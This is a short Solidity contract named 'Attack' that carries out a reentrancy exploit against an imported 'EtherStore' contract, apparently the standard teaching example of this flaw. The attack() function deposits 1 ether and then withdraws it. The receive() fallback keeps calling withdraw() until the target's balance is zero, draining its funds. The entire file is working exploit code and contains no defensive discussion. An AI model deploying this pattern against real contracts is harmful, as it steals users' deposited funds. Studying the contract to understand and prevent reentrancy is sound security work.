pragma solidity>=0.5.0 < 0.9.0;
import "./GoodContract.sol";

contract Attack
{
    EtherStore public etherstore;

    constructor(address _etherstore)
    {
        etherstore=EtherStore(_etherstore);
    }

   //call recusively untill etherstore contract balance becomes equal to zero
    receive()external payable 
    {
        if(address(etherstore).balance>0)
        {
            etherstore.withdraw();
        }
    }

    function attack()external payable
    {
        etherstore.deposit{value:1 ether}();
        etherstore.withdraw();
    }

    //helper function to get Balance
    function getBalnce()public view returns(uint)
    {
        return address(this).balance;
    }
}